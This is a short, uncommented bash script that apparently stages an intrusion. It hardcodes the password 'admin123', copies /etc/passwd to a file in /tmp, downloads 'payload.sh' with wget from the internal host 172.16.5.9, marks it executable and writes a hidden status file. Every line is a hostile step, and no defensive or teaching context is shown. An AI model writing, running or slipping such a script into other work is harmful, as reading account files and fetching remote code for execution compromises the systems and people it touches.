#!/bin/bash
password=admin123
cat /etc/passwd > /tmp/pw_dump.txt
wget http://172.16.5.9/payload.sh -O /tmp/payload.sh
chmod +x /tmp/payload.sh
echo "done" >> /tmp/.status
